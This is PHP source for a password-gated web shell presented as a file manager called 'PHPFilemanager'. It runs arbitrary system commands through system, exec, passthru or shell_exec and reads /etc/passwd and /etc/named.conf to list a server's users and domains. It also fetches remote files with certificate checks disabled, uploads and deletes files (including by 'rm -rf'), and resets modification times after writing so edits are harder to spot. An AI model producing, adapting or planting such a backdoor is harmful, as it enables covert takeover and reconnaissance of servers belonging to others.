<?php
class auth
{
	private $password;
	protected $cookie;
	protected $post;
	protected $expired = [
		60, // 1 second
		60*60, // 1 minute
		60*60*1, // 1 hour
		60*60*24, // 1 day
		60*60*24*30, // 1 month
		60*60*24*30*12 // 1 year
	];
	function __construct($password, $expired = null)
	{
		$this->password = $password;
		$this->cookie = $_COOKIE;
		$this->post = $_POST;
	}

	public function displayLogin()
	{
		?>
		<form method='post'>
			<input type='password'name='pass'>
		</form>
		<?php
	}

	public function login()
	{
		if(isset($this->password) && (trim($this->password) != '')){
			if(isset($this->post['pass'])){
				if (password_verify($this->post["pass"], $this->password)) {
					setcookie("pass", $this->password, time() + $this->expired[3], "/");
					header("Location: {$_SERVER['PHP_SELF']}");
				}
			}
			if(!isset($this->cookie['pass']) || ((isset($this->cookie['pass']) && ($this->cookie['pass'] != $this->password)))){
				$this->displayLogin();
				die();
			}
		}
	}

	public function logout()
	{
		if (isset($this->cookie["pass"])) {
			setcookie("pass", "", time() - 1);
			header("Location: {$_SERVER['PHP_SELF']}");
		}
	}
}


class listFiles
{
	protected $path;
	protected $result;
	protected $getExtensionFiles;
	
	function __construct()
	{
		$this->path = getcwd();
	}

	public function path()
	{
		return $this->path;
	}
	/*
	* @param: type(all|dir|file)
	*/
	public function list($type)
	{
		$this->result= [];
		foreach (scandir($this->path()) as $key => $value) {
			$filename = [
				"getPathname"	=> $this->path() . DIRECTORY_SEPARATOR . $value,
				"getName"		=> $value
			];

			switch ($type) {
				case 'all':
					if (is_dir($filename["getPathname"]));
					break;
				case "dir":
					if (!is_dir($filename["getPathname"]) || $value === "." || $value === "..") {
						continue 2;
					}
					break;
				
				case "file":
					if (!is_file($filename["getPathname"])) {
						continue 2;
					}
					break;
			}

			$this->result[] = $filename;
		} return $this->result;
	}

	public function mySelf()
	{
		return str_replace("/", "", $_SERVER['PHP_SELF']);
	}

	public function folders()
	{
		return $this->list("dir");
	}

	public function files()
	{
		return $this->list("file");
	}

	public function getExtension($filename)
	{
		return strtolower(pathinfo($filename, PATHINFO_EXTENSION));
	}
	/*
	* @param: dir
	* @param: array
	*/
	public function listAll($dir, &$output = array())
	{
		foreach (scandir($dir) as $key => $value) {
			$location = $dir.DIRECTORY_SEPARATOR.$value;
			if (!is_dir($location)) {
				$output[] = $location;
			} elseif ($value != "." && $value != '..') {
				$this->listAll($location, $output);
				$output[] = $location;
			}
		} return $output;
	}
	/*
	* @param: dir
	* @param: file extension
	* @param: filename|filename
	*/
	public function listAllExtension($dir, $extension = null, $kecuali = "")
	{
		if (is_writable($dir)) {
			foreach ($this->listAll($dir) as $key => $value) {
				switch ($this->getExtension($value)) {
					case $extension:
						if (preg_match("/{$this->mySelf()}|{$kecuali}$/i", basename($value), $matches) === 0) {
							print($value . "<br>");
						}
						break;
				}
			}
		}
	}
}

/**
 * 
 */
class cd extends listFiles
{
	protected static $cd;
	function __construct($cd)
	{
		self::$cd = $cd;
		return self::cd(self::$cd);
	}

	public static function cd($directory)
	{
		return chdir($directory);
	}
}

/**
 * 
 */
class Tools
{
	protected $path, $name, $resource, $data = null, $cwd = null;
	
	function __construct()
	{
		$this->path = str_replace("\\", "/", getcwd());
	}

	public function make($filename)
	{
		$this->resource = $filename;
		return $this;
	}

	public function path($path)
	{
		$this->cwd = $path;
		return $this;
	}

	public function dir()
	{
		return (!empty($this->resource)) ? mkdir($this->cwd . DIRECTORY_SEPARATOR . $this->resource) : false;
	}

	public function file($data)
	{
		foreach ($this->resource as $key => $value) {
			$explode = explode("|", $this->resource[$key]);
			foreach ($explode as $i => $file) {
				file_put_contents($file, $data);
			}
		}
	}

	public function execute($command)
	{
		$command = $command;

		switch ($command) {
			case function_exists("system"):
				@ob_start();
				@system($command);
				$buff = @ob_get_contents(); 
				@ob_end_clean();
				return $buff; 	
				break;
			
			case function_exists("exec"):
				@exec($command, $result);
				$buff = "";
				foreach ($result as $key => $value) {
					$buff .= $value;
				} return $buff;
				break;

			case function_exists("passthru"):
				@ob_start();
				@passthru($command);
				$buff = @ob_get_contents();
				@ob_end_clean();
				return $buff;
				break;

			case function_exists("shell_exec"):
				$buff = @shell_exec($command);
				return $buff;
				break;
		}
	}

	public function getPasswd()
	{
		if ($this->OS() === "Linux") {
			return $this->execute("cat /etc/passwd");
		} else {
			return false;
		}
	}

	public function upload($files)
	{
		for ($i=0; $i < count($files['name']) ; $i++) { 
			move_uploaded_file($files["tmp_name"][$i], $this->cwd . DIRECTORY_SEPARATOR .$files["name"][$i]);
		}
	}
}

class Action extends Tools
{
	protected $path, $filename;
	protected $handle;
	protected $modes = [
			"read"			=> "r",
			"write" 		=> "w",
			"writemaster"	=> "w+",
			"append"		=> "a",
			"readmaster"	=> "rb"
	];
	
	function __construct($filename = null)
	{
		$this->path = str_replace("\\", "/", getcwd());
		$this->filename = $filename;
	}

	public function getUser($filename = "/etc/passwd")
	{
		if (file_exists($filename)) {
			$this->handle = fopen($filename, $this->modes["read"]);
			while ($read = fgetc($this->handle)) {
				preg_match_all('/(.*?):x:/', $read, $matches);
				$user[] = $matches[1][0];
			} return $user;
		} else {
			return false;
		}
	}

	public function getDomian($filename = "/etc/named.conf")
	{
		if (file_exists($filename)) {
			$this->handle = fopen($filename, $this->modes["read"]);
			while ($read = fgetc($this->handle)) {
				preg_match_all("#/var/named/(.*?).db#", $read, $matches);
				$domian[] = $matches[1][0];
			} return $domian;
		} else {
			return false;
		}
	}

	public function isWIN(bool $bool)
	{
		return (substr(strtoupper(PHP_OS), 0, 3) === "WIN") ? $bool : $bool;
	}

	public function open($mode)
	{
		if (!empty(trim($this->filename))) {
			$this->handle = fopen($this->filename, $this->modes[$mode]);
			return $this;
		}
	}

	public function read()
	{
		return htmlspecialchars(file_get_contents($this->filename));
	}

	public function write($data)
	{
		fwrite($this->handle, $data);
		$ftime = filemtime($this->filename);
		if ($ftime === false) return false;
		return touch($this->filename, $ftime);
	}

	public function chname($newname)
	{
		return (!empty($this->filename)) ? rename($this->filename, $this->path . DIRECTORY_SEPARATOR . $newname) : false;
	}

	public function chmode($mode)
	{
		return (!empty($this->filename)) ? chmod($this->filename, $mode) : false;
	}

	public function validUrl($url)
	{
		if (preg_match("|^[A-Za-z0-9-]+(\.[A-Za-z0-9-]+)*(\.[A-Za-z]{2,})/?$|", $url)) {
			return true;
		}
		if (preg_match('#^([a-z][\w-]+:(?:/{1,3}|[a-z0-9%])|www\d{0,3}[.]|[a-z0-9.\-]+[.][a-z]{2,4}/)(?:[^\s()<>]+|\(([^\s()<>]+|(\([^\s()<>]+\)))*\))$#', $url)) {
			$parts = parse_url($url);
			if (!in_array($parts["scheme"], array( 'http', 'https' ))) {
				return false;
			}
			if (!preg_match("|^[A-Za-z0-9-]+(\.[A-Za-z0-9-]+)*(\.[A-Za-z]{2,})/?$|", $parts["host"])) {
				return false;
			}
			return true;
		}
		throw new Exception("Must be url", 1);
		
		return false;
	}

	public function download($url = null, $filename = null)
	{
		if (!$this->validUrl($url)) {
			$this->filename = trim($this->filename);
			if (is_file($this->filename)) {
				header("Content-Type: application/octet-stream");
				header('Content-Transfer-Encoding: binary');
				header("Content-length: ".filesize($this->filename));
				header("Cache-Control: no-cache");
				header("Pragma: no-cache");
				header("Content-disposition: attachment; filename=\"".basename($this->filename)."\";");
				while (!feof($this->handle)) {
					print(fread($this->handle, 1024*8));
					@ob_flush();
					@flush();
				}
				fclose($this->handle);
				die();
			}
		} else {
			$get = [
				$url,
				$filename
			];

			$handle = fopen($get[1], "w+");
			$ch = curl_init();
				  curl_setopt($ch, CURLOPT_URL, $get[0]);
				  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
				  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
				  curl_setopt($ch, CURLOPT_FILE, $handle);
			return curl_exec($ch);
				  curl_close($ch);
				  fclose($handle);
				  ob_flush();
				  flush();
		}
	}

	public function delete()
	{
		if (is_dir($this->filename)) {
			if (!@rmdir($this->filename) AND $this->isWIN(true)) $this->execute("rmdir /s /q {$this->filename}");
			if (!@rmdir($this->filename) AND $this->isWIN(false)) $this->execute("rm -rf {$this->filename}");
		} elseif (is_file($this->filename)) {
			if (!@unlink($this->filename) AND $this->isWIN(true)) $this->execute("del /f {$this->filename}");
			if (!@unlink($this->filename) AND $this->isWIN(false)) $this->execute("rm {$this->filename}");
		}
	}
}

function pwd() {
	$dir = preg_split("/(\\\|\/)/", getcwd());
	foreach ($dir as $key => $value) {
		if($value == '' && $key == 0) {
			echo '<a class="breadcrumb-close" href="?x=/">/</a>';
		}
		if($value == '') { 
			continue;
		}
		echo '<a class="breadcrumb-link" href="?x=';
		for ($i = 0; $i <= $key; $i++) {
			echo $dir[$i]; 
			if($i != $key) {
				echo '/';
			}
		}
		print('">'.$value.'</a>');
	}
}
if (isset($_GET['x'])) {
	cd::cd($_GET['x']);
}
$listFiles = new listFiles;
$Tools = new Tools;

?>
<head>
  <meta name="viewport" content="width=device-width,height=device-height initial-scale=1">
  <link href="https://fonts.googleapis.com/css?family=Inter:400,800,900&display=swap" rel="stylesheet">
  <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-icons/3.0.1/iconfont/material-icons.min.css">

</head>
<style type="text/css">
	@import url("https://fonts.googleapis.com/css?family=Roboto&display=swap");
	body {
		background-color: #000;
		color: #ECF0F1;
		padding: 50px 0 50px;
		overflow: hidden;
	}

	.block {
		display: block;
		padding: 5px;
		margin-top: 6px;
	}

	.bungkus {
		max-height: 85%;
		padding-top:10px;
		overflow: auto;
	}

	.grid {
		max-width: 900px;
		margin: 0 auto;
		max-height: 100%;
		background-color: #212F3D;
		border-radius:10px;
		padding-bottom:20px;
	}

	.gutter {
		margin-left: 20px;
		margin-right: 20px;
	}
	.col-img {
		width: 10%;
		float: left;
	}

	.col-33 {
		width: 100%;
		float: left;
	}

	.col-50 {
		width: 100%;
		float: left;
	}

	.info {
		display: inline-block;
		font-size:12px;
	}

	.clear {
		clear: both;
		display: block;
	}

	* {
		box-sizing: border-box;
		margin: 0;
		padding: 0;
	}

	body {
		font-family: "Roboto", sans-serif;
	}

	a {
		color: #ECF0F1;
		cursor: pointer;
		text-decoration: none;
	}
	a:hover {
		color: var(--greenapple);
	}

	.nav {
		background-color: #212F3D;
		display: grid;
		border-top-left-radius: 10px;
		border-top-right-radius: 10px;
		grid-template-rows: minmax(min-content, 60px);
	}
	.nav .brand {
		color: #ECF0F1;
		cursor: pointer;
		justify-self: left;
		margin-left: 15px;
	}
	.nav .content {
		align-content: space-evenly;
		background-color: var(--greyapple);
		display: grid;
		grid-auto-flow: column;
		place-items: center;
	}
	.nav .dropdown {
		background-color: var(--darkmatter);
		display: none;
		text-align: center;
	}
	.nav .dropdown i {
		color: white;
		padding: 20px;
	}
	.nav .dropdown i:hover {
		color: var(--greyapple);
		background-color: var(--greenapple);
	}
	.nav .links {
		display: grid;
		grid-auto-columns: minmax(min-content, 50px);
		grid-auto-flow: column;
		grid-gap: 15px;
		place-items: center;
	}
	.nav .links.nav-items {
		justify-self: right;
		padding-right: 15px;
	}
	.nav .menu {
		-webkit-user-select: none;
		cursor: pointer;
		justify-self: right;
		margin-right: 20px;
		user-select: none;
		width:200px;
		text-align: right;
	}
	.nav .menu:hover {
		opacity: 0.5;
	}

	div#nav {
		position: relative;
		justify-self: right;
	}

	div#nav a { 
		padding: 5px 15px 5px;
	}
	.dropdown-toggle { 
		/*padding: 0; background: #777; */
	}
	ul.dropdown { 
		display: none; 
		position: absolute; 
		top: 100%;
		width:83%;
		margin-top: -8px; 
		padding: 5px 5px 0 0;
	}
	
	ul.dropdown li {
		list-style-type: none;
		padding:7px;
		background-color: #283747;
	}

	ul.dropdown li:first-child {
		border-radius:7px 7px 0px 0;
	}

	ul.dropdown li:last-child {
		border-radius:0px 0 7px 7px;
	}
	
	ul.dropdown li a { 
		text-decoration: none; 
		padding: 0em 1em;
		display: block; 
		text-align: left;
		border-radius:5px;
	}

	/*class .back*/

	.back {
		padding:px;
		padding-left:15px;
	}

	/*.back a {
		background-color: #2874A6;
		padding:7px;
		border-radius:17px;
		padding-left:10px;
		padding-right:10px;
	}*/

	/*end class .back*/

	/*class .breadcrumb*/
	.breadcrumb {
		border: 1px solid #1EC692;
		border-radius: 0.25em;
		margin-bottom: 1.5em;
		max-height: 2.5em;
		overflow: hidden;
		position: relative;
		transition: all 0.3s ease-in-out;
		z-index: 1;
	}
	.breadcrumb a {
		display: block;
		padding: 0.7em 1.4em;
	}
	.breadcrumb:target {
		max-height: 20em;
	}
	.breadcrumb:target .breadcrumb-link {
		opacity: 1;
		position: static;
		visibility: visible;
	}
	.breadcrumb:target .breadcrumb--active:after {
		content: none;
	}
	.breadcrumb:target .breadcrumb-close:after {
		visibility: visible;
	}

	.breadcrumb-link {
		color: tint(#1EC692, 35%);
		opacity: 0;
		visibility: hidden;
		position: absolute;
		transition: all 0.2s;
		z-index: 0;
	}

	.breadcrumb--active {
		color: #1EC692;
		font-weight: 700;
		position: relative;
	}
	.breadcrumb--active:after {
		content: "▾";
		position: absolute;
		right: 22px;
		z-index: 1;
	}

	.breadcrumb-close {
		position: absolute;
		right: 0;
		bottom: 0;
		visibility: hidden;
		z-index: 10;
	}
	.breadcrumb-close:after {
		content: "▴";
		color: #1EC692;
	}

	@media (min-width: 700px) {
		.breadcrumb {
			border: none;
		}
		.breadcrumb a {
			display: inline;
			padding: 0.5em;
		}

		.breadcrumb-link {
			display: inline;
			opacity: 1;
			visibility: visible;
			position: static;
		}
		.breadcrumb-link:after {
			content: "/";
			margin-left: 0.5em;
			margin-right: -0.75em;
		}

		.breadcrumb--active {
			pointer-events: none;
		}
		.breadcrumb--active:after {
			content: none;
		}

		.breadcrumb-close {
			display: none !important;
		}
	}
	/*end class*/

	@media only screen and (max-width: 768px) {
		.nav .content .menu {
			display: initial;
		}
	}
	@media all and (max-width: 800px) {
		.col-33 {
			width: 50%;
		}
	}
	@media all and (max-width: 600px) {
		.col-50, .col-33 {
			width: 100%;
			float: none;
		}
	}

</style>
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script type="text/javascript">

	$(function() {
		$('.dropdown-toggle').click(function() 
		{ 
			$(this).next('.dropdown').slideToggle();
	});
		$(document).click(function(e)  
		{ 
			var target = e.target; 
			if (!$(target).is('.dropdown-toggle') && !$(target).parents().is('.dropdown-toggle')) 
				{ 
					$('.dropdown').slideUp(); 
				}
		});
	});

</script>
<div class="grid">
	<div class="nav">
		<div class="content">
			<h3 class="brand"><a href="<?= $listFiles->mySelf() ?>">PHPFilemanager</a></h3>
			<div id="nav">
				<i class="dropdown-toggle material-icons menu">menu</i>
				<ul class="dropdown">
					<li><a href="#">Home root</a></li>
					<li><a href="#">Upload</a></li>
					<li><a href="#">New Folder</a></li>
					<li><a href="#">New File</a></li>
				</ul>
			</div>
		</div>
		<div class="back">
			<!-- <a href="?x=<?= dirname($listFiles->path()) ?>">back <?= basename($listFiles->path()) ?></a> -->
			<nav id="breadcrumb" class="breadcrumb"><?php pwd(); ?></nav>
		</div>
	</div>
	<div class="clear"></div>
	<div class="bungkus">
		<?php foreach ($listFiles->folders() as $key => $value) { ?>
			<div class="col-33">
				<div class="block gutter">
					<a href="?x=<?= $value["getPathname"] ?>"><?= $value["getName"] ?></a>
					<br>
					<div class="info">size</div>
					<div class="info">permission</div>
					<div class="info">last modified</div>
				</div>
			</div>
		<?php }
		?>
		<?php foreach ($listFiles->files() as $key => $value) { ?>
			<div class="col-33">
				<div class="block gutter">
					<?= $value["getName"] ?>
					<br>
					<div class="info">size</div>
					<div class="info">permission</div>
					<div class="info">last modified</div>
				</div>
			</div>
		<?php }
		?>
	</div>
	<div class="clear"></div>
</div>
